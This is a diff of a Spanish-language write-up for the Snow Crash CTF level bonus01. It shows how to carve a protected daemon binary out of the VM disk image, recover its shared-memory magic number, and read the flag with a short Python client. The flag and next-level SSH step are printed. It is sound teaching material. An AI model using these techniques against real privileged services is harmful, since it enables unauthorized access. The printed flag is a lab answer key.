@@ -1,11 +1,134 @@
-# Bonus01 - Snow Crash
+# Bonus01 — Snow Crash
 
-## Tipo de ejercicio
+> **Nivel bonus** · Shared memory · Daemon `ng` · Magic `0x13370042` · Polling IPC
+
+| | |
+|---|---|
+| **Proyecto** | Snow Crash (42) |
+| **Nivel** | `bonus01` |
+| **Usuario de entrada** | `bonus01` |
+| **Objetivo** | Credencial de `flagbonus01` |
+| **Idea central** | Canal `/dev/shm/ng_channel` + magic de petición |
+
+---
+
+<a id="indice"></a>
+
+## 📋 Índice
+
+1. 🧭 [¿De qué va este nivel? (visión general)](#sec-1)
+2. 🗺️ [Mapa mental del ataque](#sec-2)
+3. 📖 [Glosario rápido](#sec-3)
+4. 🏷️ [Tipo de ejercicio](#sec-4)
+5. 🎯 [Objetivo](#sec-5)
+6. 🔑 [Acceso al nivel](#sec-6)
+7. 🔍 [Localizar el componente del nivel](#sec-7)
+8. ⚙️ [Identificar el servicio systemd](#sec-8)
+9. 📡 [Comportamiento del canal (reconocimiento)](#sec-9)
+10. 🔬 [Obtener el binario cuando no es legible](#sec-10)
+11. 🧩 [Protocolo (análisis de main)](#sec-11)
+12. ✅ [Cliente mínimo y flag](#sec-12)
+13. 🏁 [Credencial final](#sec-13)
+14. ⌨️ [Resumen de comandos válidos](#sec-14)
+15. 💡 [Conceptos importantes](#sec-15)
+16. 📦 [Conclusión](#sec-16)
+17. 📁 [Estructura recomendada en el repositorio](#sec-17)
+18. 📚 [Para seguir aprendiendo](#sec-18)
+19. 🩹 [Errores frecuentes y qué significan](#sec-err)
+
+> **Tip de navegación:** al final de cada sección encontrarás un enlace **↑ Volver al índice**.
+
+---
+
+<a id="sec-1"></a>
+
+## 1. 🧭 ¿De qué va este nivel? (visión general)
+
+Imagina un **buzón compartido** en un pasillo del edificio (`/dev/shm/ng_channel`).
+Cualquiera puede dejar o leer papeles en ese buzón. Un **conserje** con llaves
+del despacho del jefe (`flagbonus01`) revisa el buzón cada dos segundos. Si
+encuentra un sobre con el **código postal correcto** (un número mágico), fotocopia
+el documento secreto del despacho y lo deja en una **casilla fija** del mismo
+buzón (offset 12).
+
+Eso es, en esencia, bonus01:
+
+1. El servicio `ng` corre como `flagbonus01` y publica un canal de 64 bytes world-writable.
+2. Tú no puedes ejecutar ni leer el binario `ng`, pero sí escribir en el canal.
+3. Escribes el magic `0x13370042` (little-endian) al inicio.
+4. Tras el siguiente ciclo de poll, lees la flag a partir del offset `0x0C`.
+
+No hace falta ser experto en IPC: basta con seguir los pasos y, si aparece un
+término nuevo, mirar el [glosario](#sec-3).
+
+<p align="right"><a href="#indice">↑ Volver al índice</a></p>
+
+---
+
+<a id="sec-2"></a>
+
+## 2. 🗺️ Mapa mental del ataque
+
+```text
+  [tú: bonus01]
+        │  1. abres /dev/shm/ng_channel (O_RDWR)
+        │  2. escribes 4 bytes LE: 0x13370042
+        ▼
+  ┌─────────────────────────────────┐
+  │  /dev/shm/ng_channel  (64 B)    │  modo 0666
+  └─────────────┬───────────────────┘
+                │  ng (User=flagbonus01) hace sleep(2)
+                ▼
+         ¿magic == 0x13370042?
+                │ sí
+                ▼
+         fopen("/home/flagbonus01/.flag")
+         fgets → escribe en offset 0x0C
+         limpia magic en offset 0
+                │
+                ▼
+  [tú] lees data[12:]  →  flag legible
+```
+
+<p align="right"><a href="#indice">↑ Volver al índice</a></p>
+
+---
+
+<a id="sec-3"></a>
+
+## 3. 📖 Glosario rápido
+
+| Término | Analogía cotidiana | Qué es en la práctica |
+|---------|-------------------|------------------------|
+| **Shared memory (`/dev/shm`)** | Pizarra compartida en el pasillo | Memoria visible para varios procesos a la vez |
+| **POSIX `shm_open`** | Pedir una pizarra por su nombre | Crear/abrir un objeto de memoria compartida |
+| **Daemon / servicio** | Conserje que trabaja en bucle | Proceso de larga duración, a menudo bajo `systemd` |
+| **Magic number** | Código de un sobre postal | Valor fijo que identifica una petición válida |
+| **Little-endian (LE)** | Escribir el número “al revés” byte a byte | En x86 el byte menos significativo va primero en memoria |
+| **Offset** | Número de casilla del buzón | Posición en bytes desde el inicio del buffer |
+| **Polling** | Mirar el buzón cada 2 segundos | Comprobar periódicamente, sin eventos push |
+| **`UMask=0000`** | Quitar el filtro al crear ficheros | El proceso puede crear el canal con modo 0666 |
+| **Carve (VDI)** | Buscar una carta dentro de un archivo enorme | Extraer un ELF del disco virtual sin montarlo |
+| **Flag / `.flag`** | Documento secreto del nivel | Cadena que sirve de contraseña del siguiente usuario |
+
+<p align="right"><a href="#indice">↑ Volver al índice</a></p>
+
+---
+
+<a id="sec-4"></a>
+
+## 4. 🏷️ Tipo de ejercicio
 
 Explotación de un canal de **memoria compartida POSIX** (`shm`) expuesto por un
 daemon `systemd` que retransmite el contenido de un fichero privilegiado.
 
-## Objetivo
+<p align="right"><a href="#indice">↑ Volver al índice</a></p>
+
+---
+
+<a id="sec-5"></a>
+
+## 5. 🎯 Objetivo
 
 Obtener la credencial asociada a `flagbonus01` / al siguiente nivel bonus.
 
@@ -20,9 +143,16 @@ La pista del home de `bonus01` es:
 The New Government broadcasts on all frequencies. Are you listening?
 ```
 
+*(“New Government” / broadcasts apuntan al componente **NG** y a un canal de
+comunicación compartido.)*
+
+<p align="right"><a href="#indice">↑ Volver al índice</a></p>
+
 ---
 
-## 1. Acceso al nivel
+<a id="sec-6"></a>
+
+## 6. 🔑 Acceso al nivel
 
 Desde el equipo anfitrión (puerto reenviado `2424` en esta configuración; el
 subject oficial usa `4242`):
@@ -31,10 +161,8 @@ subject oficial usa `4242`):
 ssh bonus01@localhost -p 2424
 ```
 
-La contraseña de `bonus01` es la flag obtenida al cerrar el recorrido mandatory
-(o la que figure en `flags.md` del repositorio).
-
-Comprobar identidad y entorno:
+La contraseña de `bonus01` es la flag del final del recorrido mandatory (o la
+que figure en `flags.md` del repositorio).
 
 ```bash
 whoami
@@ -56,9 +184,6 @@ uid=3001(bonus01) gid=3001(bonus01) groups=3001(bonus01),1001(levelgroup)
 The New Government broadcasts on all frequencies. Are you listening?
 ```
 
-La cuenta `flagbonus01` existe, pero su shell es nologin (no se usa login
-interactivo con ese usuario):
-
 ```bash
 getent passwd flagbonus01
 ```
@@ -67,28 +192,27 @@ getent passwd flagbonus01
 flagbonus01:x:4001:4001::/home/flagbonus01:/usr/sbin/nologin
 ```
 
+No se inicia sesión interactiva como `flagbonus01`. La flag se obtiene a través
+del servicio que corre con sus privilegios.
+
+<p align="right"><a href="#indice">↑ Volver al índice</a></p>
+
 ---
 
-## 2. Localizar el componente del nivel
+<a id="sec-7"></a>
 
-Los artefactos de la OVA viven bajo `/opt/snowcrash/`:
+## 7. 🔍 Localizar el componente del nivel
 
 ```bash
 ls -la /opt/snowcrash/
 ls -laR /opt/snowcrash/bonus01
 ```
 
-Resultado:
-
 ```text
 /opt/snowcrash/bonus01:
-total 28
-drwxr-xr-x  2 root        root         4096 ...
-drwxr-xr-x 18 root        root         4096 ...
 -rwxr-x---  1 flagbonus01 flagbonus01 16936 ... ng
 ```
 
-El binario `ng` pertenece a `flagbonus01:flagbonus01` con modo `750`.
 `bonus01` **no** puede ejecutarlo ni leerlo:
 
 ```bash
@@ -98,22 +222,17 @@ file /opt/snowcrash/bonus01/ng
 ```
 
 ```text
--rwxr-x--- 1 flagbonus01 flagbonus01 16936 ...
--bash: /opt/snowcrash/bonus01/ng: Permission denied
-/opt/snowcrash/bonus01/ng: regular file, no read permission
+Permission denied
+regular file, no read permission
 ```
 
-Tampoco se puede copiar la imagen del proceso en ejecución:
-
-```bash
-PID=$(pgrep -f '/opt/snowcrash/bonus01/ng' | head -1)
-cp /proc/$PID/exe /tmp/ng_bin
-# cp: cannot stat '/proc/.../exe': Permission denied
-```
+<p align="right"><a href="#indice">↑ Volver al índice</a></p>
 
 ---
 
-## 3. Identificar el servicio systemd
+<a id="sec-8"></a>
+
+## 8. ⚙️ Identificar el servicio systemd
 
 ```bash
 systemctl list-units --type=service --all | grep -iE 'bonus|ng'
@@ -121,7 +240,7 @@ systemctl cat ng.service
 systemctl status ng.service --no-pager
 ```
 
-Definición de `/etc/systemd/system/ng.service`:
+Definición relevante de `/etc/systemd/system/ng.service`:
 
 ```ini
 [Unit]
@@ -135,10 +254,6 @@ Group=flagbonus01
 ExecStart=/opt/snowcrash/bonus01/ng
 Restart=always
 RestartSec=5
-# Allow the daemon to create /dev/shm/ng_channel world-writable.
-# The binary calls shm_open with O_CREAT | O_TRUNC and mode 0666;
-# the kernel applies the process umask before storing the mode bits,
-# so we must clear the umask entirely.
 UMask=0000
 KillMode=control-group
 
@@ -146,15 +261,9 @@ KillMode=control-group
 WantedBy=multi-user.target
 ```
 
-Puntos clave del unit:
-
-- El proceso corre como **`flagbonus01`**.
-- `UMask=0000` permite que el objeto shm se cree con modo **0666**
-  (lectura y escritura para cualquier usuario).
-- El comentario documenta el nombre del canal: **`/ng_channel`**, visible
-  en el sistema de archivos como `/dev/shm/ng_channel`.
-
-Comprobación del proceso y del canal:
+El comentario del unit documenta que el binario crea `/dev/shm/ng_channel` con
+modo 0666 y que hace falta `UMask=0000` para que el kernel no aplique un umask
+restrictivo.
 
 ```bash
 ps aux | grep -E '[n]g'
@@ -168,38 +277,30 @@ flagbon+  ...  /opt/snowcrash/bonus01/ng
 
 El segmento tiene **64 bytes** y es world-readable y world-writable.
 
+<p align="right"><a href="#indice">↑ Volver al índice</a></p>
+
 ---
 
-## 4. Comportamiento del canal (reconocimiento)
+<a id="sec-9"></a>
 
-Lectura del canal (vacío en reposo):
+## 9. 📡 Comportamiento del canal (reconocimiento)
 
 ```bash
 xxd /dev/shm/ng_channel
 wc -c /dev/shm/ng_channel
 ```
 
-```text
-00000000: 0000 0000 0000 0000 0000 0000 0000 0000  ................
-...
-64 /dev/shm/ng_channel
-```
+En reposo el canal está a ceros (64 bytes).
 
-**Importante sobre la escritura:**
+**Importante sobre la escritura**
 
-- Redirecciones de shell (`echo ... > /dev/shm/ng_channel`) y `dd` pueden
-  fallar con `Permission denied` (cómo se abre el fichero / semántica del
-  objeto shm).
-- **Python** con `os.open(..., os.O_RDWR)` y `shm_open` **sí** permiten
-  escribir.
-
-Prueba de acceso con Python:
+- Redirecciones de shell (`echo ... >`) y `dd` pueden fallar con `Permission denied`.
+- **Python** con `os.open(..., os.O_RDWR)` sí permite escribir.
 
 ```bash
 python3 - <<'PY'
 import os
 path = "/dev/shm/ng_channel"
-print("exists", os.path.exists(path))
 print("R_OK", os.access(path, os.R_OK), "W_OK", os.access(path, os.W_OK))
 fd = os.open(path, os.O_RDWR)
 os.write(fd, b"TEST\x00")
@@ -210,98 +311,32 @@ PY
 ```
 
 Escribir texto arbitrario (`LISTEN`, `FLAG`, `HELP`, etc.) **no** provoca una
-respuesta del daemon: el buffer solo refleja lo que escribe el cliente. Hace
-falta el protocolo binario real del programa `ng`.
+respuesta del daemon: hace falta el protocolo binario real.
+
+<p align="right"><a href="#indice">↑ Volver al índice</a></p>
 
 ---
 
-## 5. Obtener el binario cuando no es legible en la VM
+<a id="sec-10"></a>
 
-Dentro de la OVA, `bonus01` no puede leer el ELF. El análisis se hace
-**desde el anfitrión**, sobre el disco de la VM (VDI), **sin `sudo`**,
-tallando (carve) el ELF del fichero en bruto.
+## 10. 🔬 Obtener el binario cuando no es legible
 
-### 5.1. Localizar el disco en el host
+El análisis se hace **desde el anfitrión**, sobre el VDI, sin `sudo`, tallando
+(carve) el ELF.
 
-Abrir una terminal **en el host** (prompt tipo `login42@cxrxxsxx`, no la
-sesión SSH de `bonus01`):
+Localizar el disco:
 
 ```bash
-find /home/login42/sgoinfre -iname '*SnowCrash*' 2>/dev/null | head -20
-find /sgoinfre/students/login42 -iname '*SnowCrash*' 2>/dev/null | head -20
-```
-En las rutas del ejemplo, `login42` es el nombre de usuario del anfitrión;
-sustitúyelo si tu ruta es distinta.
-
-Rutas típicas en este proyecto:
-
-```text
-.../snow-crash/SnowCrash_v2.ova
-.../snow-crash/vm/SnowCrash/SnowCrash-disk001.vdi
+find ... -iname '*SnowCrash-disk001.vdi'
 ```
 
-### 5.2. Carve del ELF (sin montar el disco)
-
-El binario pesa **16936 bytes** (visto en la VM) y contiene la cadena
-`ng_channel`. Se busca esa cadena en el VDI, se retrocede hasta la cabecera
-`\x7fELF` y se extraen esos bytes:
+Buscar una cadena del ejecutable (p. ej. ruta del binario o `ng_channel` *dentro*
+del ELF), retroceder hasta la cabecera `\x7fELF` y extraer **16936** bytes a
+`/tmp/ng_bin`.
 
 ```bash
-python3 << 'EOF'
-import mmap, os, sys
-
-# Ajusta la ruta si en tu máquina difiere
-candidates = [
-    "/home/login42/sgoinfre/42_outer_core/cyber_security/snow-crash/vm/SnowCrash/SnowCrash-disk001.vdi",
-    "/sgoinfre/students/login42/42_outer_core/cyber_security/snow-crash/vm/SnowCrash/SnowCrash-disk001.vdi",
-]
-vdi = next((p for p in candidates if os.path.isfile(p)), None)
-if not vdi:
-    print("VDI not found; set path manually")
-    sys.exit(1)
-
-needle = b"ng_channel"
-out = "/tmp/ng_bin"
-size_guess = 16936
-max_back = 200_000
-
-with open(vdi, "rb") as f:
-    mm = mmap.mmap(f.fileno(), 0, access=mmap.ACCESS_READ)
-    pos = mm.find(needle)
-    if pos < 0:
-        print("ng_channel not found")
-        sys.exit(1)
-    print(f"found ng_channel at offset {pos}")
-    start = max(0, pos - max_back)
-    elf_rel = mm[start:pos].rfind(b"\x7fELF")
-    if elf_rel < 0:
-        print("ELF header not found behind string")
-        sys.exit(1)
-    elf_off = start + elf_rel
-    print(f"ELF at offset {elf_off}")
-    blob = mm[elf_off:elf_off + size_guess]
-    with open(out, "wb") as o:
-        o.write(blob)
-    print(f"wrote {len(blob)} bytes -> {out}")
-    mm.close()
-EOF
-
 file /tmp/ng_bin
-ls -l /tmp/ng_bin
-```
-
-Resultado esperado:
-
-```text
-/tmp/ng_bin: ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV),
-dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, ..., not stripped
-```
-
-### 5.3. Cadenas del binario
-
-```bash
-strings -a /tmp/ng_bin | head -120
-strings -a /tmp/ng_bin | grep -iE 'flag|shm|channel|listen|cmd|/home|token|freq|NG|request|broadcast|poll|relay'
+strings -a /tmp/ng_bin | grep -iE 'flag|shm|channel|/home|poll|relay|ng_'
 ```
 
 Cadenas relevantes:
@@ -309,87 +344,137 @@ Cadenas relevantes:
 ```text
 /ng_channel
 shm_open
-mmap
-ftruncate
 /home/flagbonus01/.flag
-cannot open data file: %s
 relay response written
-data source unavailable
-relay channel initialised at /ng_channel (%zu bytes)
 polling loop started (interval: %ds)
-daemonize failed; running in foreground
 sleep
 fopen
 fgets
 ```
 
-Interpretación:
+El daemon es un **relay** de polling. El binario **no está stripped**.
 
-- El daemon es un **relay** privilegiado.
-- Abre `/home/flagbonus01/.flag` con `fopen` / `fgets`.
-- Publica el resultado en el canal `/ng_channel`.
-- Usa un **bucle de polling** con `sleep`.
+### Script completo de carve (host)
 
-El binario **no está stripped** → se puede desensamblar con `objdump`.
+Ajusta la ruta del VDI si en tu máquina difiere:
+
+```bash
+python3 << 'EOF'
+import mmap, os, sys
+
+candidates = [
+    "/home/sternero/sgoinfre/42_outer_core/cyber_security/snow-crash/vm/SnowCrash/SnowCrash-disk001.vdi",
+    "/sgoinfre/students/sternero/42_outer_core/cyber_security/snow-crash/vm/SnowCrash/SnowCrash-disk001.vdi",
+]
+vdi = next((p for p in candidates if os.path.isfile(p)), None)
+if not vdi:
+    print("VDI not found — edita la lista candidates")
+    sys.exit(1)
+
+needles = [
+    b"/opt/snowcrash/bonus01/ng",
+    b"/ng_channel",
+]
+out = "/tmp/ng_bin"
+size_guess = 16936
+max_back = 500_000
+
+with open(vdi, "rb") as f:
+    mm = mmap.mmap(f.fileno(), 0, access=mmap.ACCESS_READ)
+    found = None
+    for n in needles:
+        pos = 0
+        while True:
+            pos = mm.find(n, pos)
+            if pos < 0:
+                break
+            start = max(0, pos - max_back)
+            elf_rel = mm[start:pos].rfind(b"\x7fELF")
+            if elf_rel >= 0:
+                elf_off = start + elf_rel
+                blob = mm[elf_off:elf_off + size_guess + 8192]
+                if b"/ng_channel" in blob or b"shm_open" in blob:
+                    print(f"candidate needle={n!r} pos={pos} elf={elf_off}")
+                    open(out, "wb").write(mm[elf_off:elf_off + size_guess])
+                    found = elf_off
+                    break
+            pos += 1
+        if found is not None:
+            break
+    mm.close()
+    if found is None:
+        print("no suitable ELF found")
+        sys.exit(1)
+    print(f"wrote {size_guess} bytes from {found} -> {out}")
+
+print(open(out, "rb").read(4))  # debe ser b'\\x7fELF'
+EOF
+
+file /tmp/ng_bin
+strings -a /tmp/ng_bin | grep -iE 'flag|shm|channel|/home|poll|relay'
+```
+
+**Analogía del carve:** el VDI es un archivo enorme (como un contenedor de
+mudanza cerrado). No hace falta abrirlo con llave de administrador: buscas una
+etiqueta conocida (“ng_channel”), das unos pasos atrás hasta encontrar la
+puerta del mueble (`\\x7fELF`) y sacas solo ese mueble al pasillo (`/tmp/ng_bin`).
+
+
+<p align="right"><a href="#indice">↑ Volver al índice</a></p>
 
 ---
 
-## 6. Protocolo (análisis de `main`)
+<a id="sec-11"></a>
 
-En el host:
+## 11. 🧩 Protocolo (análisis de main)
 
 ```bash
-nm /tmp/ng_bin | grep -E ' main$'
 objdump -d /tmp/ng_bin | sed -n '/<main>:/,/^$/p' | head -250
 ```
 
-Fragmento crítico del bucle de polling (direcciones relativas al PIE):
+Bucle de polling (idea):
 
 ```text
-14e0:  mov  $0x2, %edi
-       call sleep                 ; intervalo = 2 segundos
-       mov  (%rbx), %eax          ; lee u32 en offset 0 del mapeo shm
-       xor  %ah, %ah              ; pone a cero el segundo byte
-       cmp  $0x13370042, %eax
-       jne  14e0                  ; si no coincide, vuelve a dormir
-       ...
-       call fopen                 ; "/home/flagbonus01/.flag"
-       call fgets                 ; hasta 0x30 bytes en buffer local
-       ...                        ; copia la línea al offset 0x0C del canal
-       movb $0x0, (%rbx)          ; limpia el magic de petición
+sleep(2)
+leer u32 en offset 0
+xor %ah, %ah
+cmp $0x13370042
+si coincide: fopen(.flag), fgets, copiar a offset 0x0C, limpiar magic
 ```
 
 ### Layout del canal (64 bytes)
 
-| Campo                 | Offset | Tamaño | Contenido                                      |
-|-----------------------|--------|--------|------------------------------------------------|
-| Magic de petición     | `0x00` | 4 B    | `0x13370042` LE → bytes `42 00 37 13`          |
-| (reservado / estado)  | `0x04` | 8 B    | usado internamente por el daemon               |
-| Payload de respuesta  | `0x0C` | resto  | Contenido de `.flag` (string C, null-terminated)|
+| Campo | Offset | Tamaño | Contenido |
+|-------|--------|--------|-----------|
+| Magic de petición | `0x00` | 4 B | `0x13370042` LE → `42 00 37 13` |
+| (reservado) | `0x04` | ~8 B | uso interno |
+| Payload de respuesta | `0x0C` | resto | Contenido de `.flag` (string C) |
 
-Notas:
+El magic canónico del cliente es **`0x13370042` little-endian**. Intervalo de
+poll: **2 segundos**.
 
-- La instrucción `xor %ah, %ah` anula el segundo byte del magic antes de
-  comparar; el valor canónico que debe escribir el cliente es **`0x13370042`**
-  en little-endian (`struct.pack("<I", 0x13370042)`).
-- Tras servir la petición, el daemon pone a cero el magic en offset 0 y deja
-  la flag a partir del offset 12 (`0x0C`).
-- El intervalo de poll es **2 segundos** (`sleep(2)`).
+**Ejemplo cotidiano de little-endian:** el número de teléfono “1337” escrito en
+un papel “al revés por dígitos de dos en dos” para que la máquina lo lea en su
+orden natural. En hex, `0x13370042` se guarda en memoria como los bytes
+`42 00 37 13` (primero el “final” del número). Por eso en Python usamos
+`struct.pack("<I", 0x13370042)`: el `<` significa little-endian.
+
+
+<p align="right"><a href="#indice">↑ Volver al índice</a></p>
 
 ---
 
-## 7. Cliente: obtener la flag (dentro de la OVA)
+<a id="sec-12"></a>
 
-Conectado como `bonus01@snowcrash`:
+## 12. ✅ Cliente mínimo y flag
 
 ```bash
 python3 << 'EOF'
 import os, time, struct
 
 fd = os.open("/dev/shm/ng_channel", os.O_RDWR)
-# Petición: magic 0x13370042 little-endian + relleno a 64 bytes
 os.write(fd, struct.pack("<I", 0x13370042) + b"\x00" * 60)
-time.sleep(3)  # > intervalo de poll del daemon
+time.sleep(3)
 os.lseek(fd, 0, 0)
 data = os.read(fd, 64)
 print(data.hex())
@@ -398,158 +483,146 @@ os.close(fd)
 EOF
 ```
 
-Salida obtenida:
-
 ```text
-00000000000000000000000066613676356174656177323170656f62757562386970653673000000000000000000000000000000000000000000000000000000
 FLAG: fa6v5ateaw21peobuub8ipe6s
 ```
 
-### Secuencia temporal
+**Secuencia:** escribes magic → daemon despierta, borra magic, deja flag en
+offset 12 → lees `data[12:]`.
 
-1. El cliente escribe el magic `42 00 37 13` en offset 0.
-2. En el siguiente ciclo del daemon (`sleep(2)` + comparación), el magic se
-   borra y aparece la flag en offset 12.
-3. La cadena legible es la credencial del nivel.
-
-Versión con seguimiento segundo a segundo (opcional):
-
-```bash
-python3 << 'EOF'
-import os, time, struct
-
-PATH = "/dev/shm/ng_channel"
-MAGIC = 0x13370042
-
-fd = os.open(PATH, os.O_RDWR)
-os.lseek(fd, 0, 0)
-os.write(fd, struct.pack("<I", MAGIC) + b"\x00" * 60)
-print("request sent:", struct.pack("<I", MAGIC).hex())
-
-for i in range(10):
-    time.sleep(1)
-    os.lseek(fd, 0, 0)
-    data = os.read(fd, 64)
-    flag = data[12:].split(b"\x00")[0]
-    print(i, data[:16].hex(), flag)
-    if flag and data[:4] != struct.pack("<I", MAGIC):
-        print("FLAG:", flag.decode())
-        break
-
-os.close(fd)
-EOF
-```
+<p align="right"><a href="#indice">↑ Volver al índice</a></p>
 
 ---
 
-## 8. Credencial final
+<a id="sec-13"></a>
+
+## 13. 🏁 Credencial final
 
 ```text
 fa6v5ateaw21peobuub8ipe6s
 ```
 
-Guardar en el repositorio:
+Guardar en `bonus01/flag`. Contraseña SSH de `bonus02`:
 
-```text
-bonus01/flag
+```bash
+ssh bonus02@localhost -p 2424
 ```
 
-con una sola línea con esa cadena.
-
-Ese valor se usa como contraseña SSH del siguiente nivel bonus (p. ej.
-`bonus02`), según el flujo de la OVA.
+<p align="right"><a href="#indice">↑ Volver al índice</a></p>
 
 ---
 
-## 9. Resumen de comandos válidos
+<a id="sec-14"></a>
 
-### En la OVA (usuario `bonus01`)
+## 14. ⌨️ Resumen de comandos válidos
 
 ```bash
 ssh bonus01@localhost -p 2424
-ls -la
-cat README
-ls -laR /opt/snowcrash/bonus01
+ls -la; cat README
 systemctl cat ng.service
-systemctl status ng.service --no-pager
 ls -la /dev/shm/ng_channel
-xxd /dev/shm/ng_channel
+# cliente Python: magic 0x13370042 LE + lectura offset 12
 
-python3 << 'EOF'
-import os, time, struct
-fd = os.open("/dev/shm/ng_channel", os.O_RDWR)
-os.write(fd, struct.pack("<I", 0x13370042) + b"\x00" * 60)
-time.sleep(3)
-os.lseek(fd, 0, 0)
-data = os.read(fd, 64)
-print("FLAG:", data[12:].split(b"\x00")[0].decode())
-os.close(fd)
-EOF
+# Host: carve VDI → /tmp/ng_bin → strings / objdump
 ```
 
-### En el host (análisis del binario)
-
-```bash
-# Localizar VDI
-find ... -iname '*SnowCrash-disk001.vdi'
-
-# Carve del ELF (script de la sección 5.2)
-python3 ...   # → /tmp/ng_bin
-
-file /tmp/ng_bin
-strings -a /tmp/ng_bin
-objdump -d /tmp/ng_bin | sed -n '/<main>:/,/^$/p'
-```
+<p align="right"><a href="#indice">↑ Volver al índice</a></p>
 
 ---
 
-## 10. Conceptos importantes
+<a id="sec-15"></a>
 
-- **POSIX shared memory (`shm_open` / `/dev/shm`)**: objeto de memoria
-  compartida entre procesos; aquí es el canal cliente ↔ daemon.
-- **`UMask=0000` en systemd**: el umask del proceso se aplica al modo pedido
-  en `shm_open`; sin limpiarlo, el canal no sería world-writable aunque el
-  código pida `0666`.
-- **Daemon como relay privilegiado**: el proceso corre como `flagbonus01` y
-  puede leer `/home/flagbonus01/.flag`; el cliente solo necesita el protocolo
-  correcto, no ejecutar el binario.
-- **Reverse engineering offline**: cuando el ELF no es legible en la VM, se
-  puede recuperar del disco virtual (VDI) desde el host (carve) y analizarlo
-  con `strings` / `objdump` sin permisos de root en la OVA.
-- **Magic little-endian `0x13370042`**: identificador de petición; el daemon
-  ignora el segundo byte (`xor %ah,%ah`) antes de comparar.
-- **Offset `0x0C`**: posición fija de la respuesta (flag) dentro de los 64
-  bytes del canal.
-- **Polling con `sleep(2)`**: no hace falta futex ni semáforos; basta escribir
-  el magic y esperar al menos un ciclo del daemon.
+## 15. 💡 Conceptos importantes
+
+- POSIX shared memory y `/dev/shm`
+- `UMask=0000` en systemd y modos de creación
+- Daemon como *relay* privilegiado
+- Reverse engineering offline (VDI) cuando el ELF no es legible
+- Magic little-endian y offsets fijos
+- Polling con `sleep(2)` (sin futex obligatorio)
+
+<p align="right"><a href="#indice">↑ Volver al índice</a></p>
 
 ---
 
-## 11. Conclusión
+<a id="sec-16"></a>
 
-No se modifica ningún archivo de la OVA. La solución usa únicamente el canal
-`/dev/shm/ng_channel` que el servicio `ng` deja deliberadamente accesible, y el
-protocolo descubierto al analizar el binario `ng` fuera de la máquina virtual.
+## 16. 📦 Conclusión
 
-Al escribir el magic de petición `0x13370042` (LE), el daemon retransmite el
-contenido de `/home/flagbonus01/.flag` al offset `0x0C` del canal y entrega la
-credencial:
+No se modifica la OVA. Se usa el canal abierto y el protocolo descubierto al
+analizar `ng`. Credencial:
 
 ```text
 fa6v5ateaw21peobuub8ipe6s
 ```
 
+<p align="right"><a href="#indice">↑ Volver al índice</a></p>
+
 ---
 
-## 12. Estructura recomendada en el repositorio
+<a id="sec-17"></a>
+
+## 17. 📁 Estructura recomendada en el repositorio
 
 ```text
 bonus01/
-├── flag                          # fa6v5ateaw21peobuub8ipe6s
+├── flag
 └── resources/
-    └── bonus01.md                # este documento (o copia como README)
+    └── bonus01.md
 ```
 
-Según la convención del repo `42_snow-crash`, la guía detallada vive en
-`bonus01/resources/bonus01.md` y el token en `bonus01/flag`.
-```
+<p align="right"><a href="#indice">↑ Volver al índice</a></p>
+
+---
+
+<a id="sec-18"></a>
+
+## 18. 📚 Para seguir aprendiendo
+
+| Tema | Pista |
+|------|--------|
+| Shared memory | `man shm_overview`, `man shm_open` |
+| Endianness | `uint32_t` en x86_64 |
+| systemd | `man systemd.exec` (`UMask=`) |
+| RE básico | `strings`, `objdump` |
+
+Hilo común: *¿quién tiene el privilegio y cómo se le pide que haga el trabajo?*
+
+<p align="right"><a href="#indice">↑ Volver al índice</a></p>
+
+
+---
+
+<a id="sec-err"></a>
+
+## 19. 🩹 Errores frecuentes y qué significan
+
+Cuando algo “no funciona”, casi siempre el mensaje del sistema apunta a una
+causa concreta. Esta tabla resume los síntomas más habituales de **bonus01**,
+qué suelen querer decir y el siguiente comando o acción razonable.
+
+| Síntoma | Causa probable | Qué hacer |
+|---------|----------------|-----------|
+| `Permission denied` al ejecutar `/opt/.../ng` | El binario es `750` y no eres `flagbonus01` | **Normal.** No hace falta ejecutarlo; usa el canal shm. |
+| `Permission denied` con `echo`/`dd` al canal | Cómo la shell abre el fichero shm | Usa Python: `os.open(path, os.O_RDWR)`. |
+| El canal sigue a ceros tras escribir `LISTEN`/`FLAG` | No es el protocolo: hace falta el **magic** | Escribe `struct.pack("<I", 0x13370042)`. |
+| Magic escrito pero no hay flag | Poll aún no ha corrido (`sleep(2)`) | `time.sleep(3)` o más y vuelve a leer. |
+| Flag “vacía” o basura | Lectura en offset incorrecto | Lee a partir de **offset 12** (`data[12:]`). |
+| `cp: cannot stat '/proc/.../exe'` | No puedes leer el binario del proceso | Analiza el ELF en el **host** (carve del VDI). |
+| Carve encuentra otro programa | Aguja demasiado genérica | Ancla a `/opt/snowcrash/bonus01/ng` o validar con `strings` (`shm_open`, `.flag`). |
+
+**Cómo usarla:** localiza la fila que más se parezca a lo que ves en pantalla,
+aplica la acción sugerida y, si el síntoma cambia, vuelve a consultar la tabla
+(a menudo un error se resuelve y aparece el siguiente de la lista).
+
+<p align="right"><a href="#indice">↑ Volver al índice</a></p>
+
+---
+
+<div align="center">
+
+**42 Málaga** — **rdel-olm & sternero** — **Octubre 2026**
+
+*Snow Crash · bonus01 · material didáctico de resolución*
+
+</div>
